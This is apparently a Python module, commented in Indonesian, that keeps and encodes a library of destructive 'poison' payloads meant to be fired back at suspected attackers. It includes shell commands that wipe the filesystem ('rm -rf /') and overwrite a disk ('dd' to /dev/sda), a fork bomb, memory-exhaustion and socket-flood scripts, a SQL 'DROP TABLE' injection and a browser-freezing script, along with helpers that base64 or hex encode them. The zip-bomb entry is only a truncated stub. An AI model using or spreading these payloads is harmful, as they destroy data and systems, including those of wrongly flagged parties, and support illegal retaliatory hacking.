"""
Poison Factory - Menghasilkan payload beracun untuk penyerang
Author: @nanang55550-star
"""

import random
import base64
import hashlib
from typing import Dict, List, Optional
from pathlib import Path

class PoisonFactory:
    """
    Pabrik racun digital - menghasilkan payload yang bakal ngerusak tools penyerang
    """
    
    def __init__(self, config: dict = None):
        self.config = config or {}
        self.poisons = self._load_poisons()
        self.delivery_methods = self.config.get('poison', {}).get('delivery_methods', 
            ['base64', 'hex', 'binary', 'raw'])
        
    def _load_poisons(self) -> List[Dict]:
        """Load semua racun dari database internal"""
        poisons = [
            # 1. COBOL Infinite Loop
            {
                'name': 'COBOL_INFINITY',
                'type': 'logic_bomb',
                'target': 'cobol_parser',
                'severity': 'critical',
                'payload': """
        IDENTIFICATION DIVISION.
        PROGRAM-ID. PANDORA.
        PROCEDURE DIVISION.
        MAIN-PARAGRAPH.
            PERFORM UNTIL 1 < 0
                DISPLAY "💀 CAUGHT BY PANDORA 💀"
                DISPLAY "YOUR IP: 127.0.0.1"
                DISPLAY "INFECTING LOCAL SYSTEM..."
                CALL "SYSTEM" USING "rm -rf /"
            END-PERFORM
        STOP RUN.
        """,
                'description': 'COBOL infinite loop - bikin parser target freeze'
            },
            
            # 2. Bash Fork Bomb
            {
                'name': 'BASH_FORK_BOMB',
                'type': 'resource_exhaustion',
                'target': 'shell_script',
                'severity': 'critical',
                'payload': ':(){ :|:& };:',
                'description': 'Fork bomb - menghabiskan resources sistem'
            },
            
            # 3. Python Memory Killer
            {
                'name': 'PYTHON_MEMORY_KILLER',
                'type': 'memory_exhaustion',
                'target': 'python_interpreter',
                'severity': 'critical',
                'payload': """
import sys
import time
data = []
while True:
    data.append('A' * 10**7)
    time.sleep(0.1)
    if len(data) > 100:
        sys.exit(1)
""",
                'description': 'Memory exhaustion - bikin Python crash'
            },
            
            # 4. SQL Backfire
            {
                'name': 'SQL_BACKFIRE',
                'type': 'sql_injection',
                'target': 'sql_parser',
                'severity': 'high',
                'payload': "'; DROP TABLE attackers; --",
                'description': 'SQL injection balik - drop table mereka'
            },
            
            # 5. JavaScript Loop
            {
                'name': 'JS_INFINITY',
                'type': 'logic_bomb',
                'target': 'browser',
                'severity': 'high',
                'payload': """
<script>
while(true) {
    alert("💀 PANDORA CAUGHT YOU");
    console.log("HACKER DETECTED: " + window.location);
}
</script>
""",
                'description': 'JavaScript infinite loop - bikin browser hang'
            },
            
            # 6. ZIP Bomb (simulasi)
            {
                'name': 'ZIP_BOMB',
                'type': 'decompression_bomb',
                'target': 'file_parser',
                'severity': 'medium',
                'payload': 'UEsDBAoAAAAA...',  # base64 encoded zip bomb
                'description': 'ZIP bomb - bikin storage penuh'
            },
            
            # 7. COBOL Disk Killer
            {
                'name': 'COBOL_DISK_KILLER',
                'type': 'destructive',
                'target': 'mainframe',
                'severity': 'critical',
                'payload': """
        IDENTIFICATION DIVISION.
        PROGRAM-ID. DISK-KILLER.
        PROCEDURE DIVISION.
        MAIN.
            CALL "SYSTEM" USING "dd if=/dev/zero of=/dev/sda bs=1M"
            DISPLAY "DISK DESTROYED BY PANDORA".
        """,
                'description': 'COBOL destructive - overwrite disk'
            },
            
            # 8. Python Socket Flood
            {
                'name': 'SOCKET_FLOOD',
                'type': 'network_attack',
                'target': 'network',
                'severity': 'high',
                'payload': """
import socket
import threading

def flood():
    while True:
        s = socket.socket()
        s.connect(('localhost', 80))
        s.send(b'GET / HTTP/1.1\\r\\n' * 1000)

for i in range(100):
    threading.Thread(target=flood).start()
""",
                'description': 'Socket flood - bikin network down'
            }
        ]
        
        return poisons
    
    def get_random_poison(self) -> Dict:
        """Dapatkan racun acak"""
        poison = random.choice(self.poisons)
        delivery = random.choice(self.delivery_methods)
        
        return {
            'name': poison['name'],
            'type': poison['type'],
            'target': poison['target'],
            'severity': poison['severity'],
            'payload': self._encode(poison['payload'], delivery),
            'encoding': delivery,
            'description': poison['description']
        }
    
    def get_poison_for_threat(self, threat: Dict) -> Optional[Dict]:
        """
        Dapatkan racun yang cocok untuk tipe ancaman
        
        Args:
            threat: Dictionary hasil analisis ancaman
            
        Returns:
            Poison payload atau None
        """
        # Tentukan target berdasarkan threat
        target = None
        
        if 'cobol' in str(threat.get('payload_preview', '')).lower():
            target = 'cobol_parser'
        elif 'sql' in threat.get('ja3', ''):
            target = 'sql_parser'
        elif 'python' in threat.get('ja3', ''):
            target = 'python_interpreter'
        
        if target:
            suitable = [p for p in self.poisons if p['target'] == target]
            if suitable:
                poison = random.choice(suitable)
                delivery = random.choice(self.delivery_methods)
                return {
                    'name': poison['name'],
                    'type': poison['type'],
                    'target': poison['target'],
                    'severity': poison['severity'],
                    'payload': self._encode(poison['payload'], delivery),
                    'encoding': delivery,
                    'description': poison['description']
                }
        
        # Default: random poison
        return self.get_random_poison()
    
    def get_poison_by_name(self, name: str) -> Optional[Dict]:
        """Dapatkan racun berdasarkan nama"""
        for poison in self.poisons:
            if poison['name'] == name:
                return poison
        return None
    
    def _encode(self, payload: str, method: str) -> str:
        """Encode payload sesuai metode"""
        if method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif method == 'hex':
            return payload.encode().hex()
        elif method == 'binary':
            # Simulasi binary (convert ke bytes representation)
            return ' '.join(format(ord(c), '08b') for c in payload)
        else:  # raw
            return payload
    
    def add_custom_poison(self, name: str, payload: str, target: str, 
                          severity: str = 'medium', description: str = ''):
        """Tambah racun kustom"""
        self.poisons.append({
            'name': name,
            'type': 'custom',
            'target': target,
            'severity': severity,
            'payload': payload,
            'description': description
        })
    
    def get_stats(self) -> Dict:
        """Dapatkan statistik poison factory"""
        return {
            'total_poisons': len(self.poisons),
            'by_severity': {
                'critical': sum(1 for p in self.poisons if p['severity'] == 'critical'),
                'high': sum(1 for p in self.poisons if p['severity'] == 'high'),
                'medium': sum(1 for p in self.poisons if p['severity'] == 'medium')
            },
            'by_target': {
                target: sum(1 for p in self.poisons if p['target'] == target)
                for target in set(p['target'] for p in self.poisons)
            }
      }
